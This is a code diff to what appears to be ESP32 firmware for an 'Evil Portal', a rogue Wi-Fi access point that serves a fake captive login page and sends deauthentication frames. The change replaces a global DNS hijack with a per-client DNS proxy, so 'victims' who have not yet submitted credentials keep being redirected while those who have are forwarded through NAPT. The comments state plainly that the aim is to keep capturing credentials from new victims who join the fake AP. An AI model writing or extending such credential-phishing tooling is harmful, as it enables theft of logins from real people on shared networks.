@@ -218,8 +218,14 @@ void EvilPortal::beginAP() {
     while (millis() - tmp < 3000) yield();
 
     setupRoutes();
-    dnsServer.start(53, "*", WiFi.softAPIP());
+    if (!_bridgeMode) {
+        dnsServer.start(53, "*", WiFi.softAPIP());
+    }
     webServer.begin();
+
+    if (_bridgeMode) {
+        _dnsProxy.start(apGateway);
+    }
 }
 
 void EvilPortal::setupRoutes() {
@@ -365,8 +371,10 @@ void EvilPortal::loop() {
             shouldRedraw = false;
         }
 
-        if (_dnsHijackActive) {
+        if (!_bridgeMode) {
             dnsServer.processNextRequest();
+        } else {
+            _dnsProxy.sweep(millis());
         }
 
         if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
@@ -408,6 +416,7 @@ void EvilPortal::loop() {
                 vTaskDelay(100 / portTICK_PERIOD_MS);
 
                 if (_bridgeMode) {
+                    _dnsProxy.stop();
                     esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
                     if (sta_netif != nullptr) {
                         esp_netif_napt_disable(sta_netif);
@@ -805,15 +814,10 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
                 (unsigned)_authedIps.size()
             );
         }
-        if (_dnsHijackActive) {
-            // Release the captive hijack once any victim submits. Clients that
-            // had a cached DNS answer (almost all modern phones do) can now
-            // egress via NAPT; new lookups to 192.168.4.1 will silently time
-            // out. A proper per-client DNS proxy is tracked as follow-on work.
-            _dnsHijackActive = false;
-            dnsServer.stop();
-            Serial.println("[PORTAL] bridge: DNS hijack released after first authed cred");
-        }
+        // BridgeDnsProxy flips behaviour per-client automatically via the
+        // shared _authedIps set: unauthed -> hijack, authed -> forward.
+        // New victims joining the fake AP after this point still see the
+        // captive portal (correct fix for Phase 2e's global-stop limitation).
     }
 
     capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
